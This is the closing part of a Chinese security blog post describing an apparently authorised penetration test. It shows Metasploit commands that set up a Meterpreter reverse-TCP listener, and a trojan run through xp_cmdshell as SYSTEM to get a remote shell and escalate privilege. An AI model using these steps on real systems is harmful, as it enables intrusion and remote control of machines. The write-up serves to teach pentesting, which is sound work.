+<p>　　<img src="https://s1.ax1x.com/2020/10/19/0xupkQ.png"><br>　　生成的木马将会在当前目录下<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xuutJ.png"><br>　　将kali中的install.exe拖到windows中后，成功上传<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xusnf.png"><br>　　回到kali中，依次输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler  </span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp  </span><br><span class="line"><span class="built_in">set</span> lhost 192.168.46.129     //内网主机ip</span><br><span class="line"><span class="built_in">set</span> lport 8080               //内网端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>　　成功开启监听<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xKoRA.png"><br>　　接下来就是运行木马了，这里要注意的是，什么样的权限，无论运行什么程序它赋予的权限也是一样的。如果我直接在蚁剑中执行马子，那么此马子的权限还是iis，而前面通过xp_cmdshell得知权限为system，所以还是要用xp_cmdshell来执行马子<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xGHfO.png"><br>　　session成功建立，如果不成功，有可能是防火墙，杀软在捣乱，谁叫我人品好呢。要是对方安装个杀软，我还要搞免杀，也不至于这么顺利<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xJ9tf.png"><br>　　提权成功<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xJZBn.png"><br>　　剩下的就是后渗透阶段了，永久后门植入，权限维持，域渗透等等。由于本人水平有限，文中难免有错误或遗漏之处，还请谅解，最后感谢你的阅读！</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　马子上线的第二天就被对方发现了，这么明显的马名，不被发现也难，错误示范，大家别学我啊(#-.-)<img src="https://s1.ax1x.com/2020/10/19/0xtAwn.jpg"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/45983.html">一次授权渗透实战</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">麦当</a></p>
+        <p><span>发布时间:</span>2020-10-12, 21:17:17</p>
+        <p><span>最后更新:</span>2020-10-12, 21:17:17</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/45983.html" title="一次授权渗透实战">http://maidang.cool/45983.html</a>
+            <span class="copy-path" data-clipboard-text="From http://maidang.cool/45983.html　　By 麦当" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/34786.html">
+                    数据结构之链表篇
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞挖掘"><span class="toc-text">漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用xp-cmdshell拿到webshell"><span class="toc-text">利用xp_cmdshell拿到webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-text">提权　　</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"一次授权渗透实战　| Lion　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/34786.html" title="下一篇: 数据结构之链表篇">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/45983.html">一次授权渗透实战</a></li><li class="post-list-item"><a class="post-list-link" href="/34786.html">数据结构之链表篇</a></li><li class="post-list-item"><a class="post-list-link" href="/57354.html">DVWA</a></li><li class="post-list-item"><a class="post-list-link" href="/48647.html">burpsuite</a></li><li class="post-list-item"><a class="post-list-link" href="/57748.html">Windows提权</a></li><li class="post-list-item"><a class="post-list-link" href="/28534.html">获取酷我音乐，网易云真实外链</a></li><li class="post-list-item"><a class="post-list-link" href="/35585.html">hexo博客恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/38686.html">hexo博客备份</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+      </div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i>
+                
+                2020 麦当
+            </div>
+            <div class="footer-right">
+                我的青春回忆录
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span style='display:inline'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user"
+                                                                                         aria-hidden="true"></i><span
+                                    id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+
+                
+                    <span>| </span>
+                
+
+                
+                    <span style='display:inline'>
+                        <span id="page-visit" title="Page Hits"><i class="fa fa-eye"
+                                                                                         aria-hidden="true"></i><span
+                                    id="busuanzi_value_site_pv"></span>
+                        </span>
+                    </span>
+                
+                <br/>
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+                <script>
+                    var now = new Date();
+
+                    function createtime() {
+                        var grt = new Date("1/1/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+                        now.setTime(now.getTime() + 250);
+                        days = (now - grt) / 1000 / 60 / 60 / 24;
+                        dnum = Math.floor(days);
+                        hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+                        hnum = Math.floor(hours);
+                        if (String(hnum).length == 1) {
+                            hnum = "0" + hnum;
+                        }
+                        minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+                        mnum = Math.floor(minutes);
+                        if (String(mnum).length == 1) {
+                            mnum = "0" + mnum;
+                        }
+                        seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+                        snum = Math.round(seconds);
+                        if (String(snum).length == 1) {
+                            snum = "0" + snum;
+                        }
+                        document.getElementById("timeDate").innerHTML = "我在这里 " + dnum + " 天 ";
+                        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+                    }
+
+                    setInterval("createtime()", 250);
+                </script>
+
+            </div>
+
+        
+
+    </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                //自定义背景图片甩到路过图床
+                var ImgUrl = ["https://s1.ax1x.com/2020/04/20/JQPYX6.jpg","https://s1.ax1x.com/2020/04/20/JQPJ6x.jpg",
+                              "https://s1.ax1x.com/2020/04/20/JQPG11.jpg","https://s1.ax1x.com/2020/04/20/JQP8pR.jpg",
+                              "https://s1.ax1x.com/2020/04/20/JQP1h9.jpg","https://s1.ax1x.com/2020/04/20/JQPltJ.jpg",
+                              "https://s1.ax1x.com/2020/04/20/JQpR74.jpg"];
+
+                //如果想单一背景图片更好img就行
+                // var img = ImgUrl[Math.floor((Math.random()*ImgUrl.length))];
+                var img = "https://s1.ax1x.com/2020/04/20/JQpR74.jpg";
+                var backgroundimg = "url(" + img + ")";//.replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover","background-position":"center center"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+            
+            
+            
+             archives: ".archive-article-title", 
+            
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+
+  </div>
+  <!--  实现点击出爱心-->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+  <script type="text/javascript" src="/js/src/value.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"hOffset":-15,"vOffset":-80,"position":"right","width":200},"mobile":{"show":false},"react":{"opacity":0.6},"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
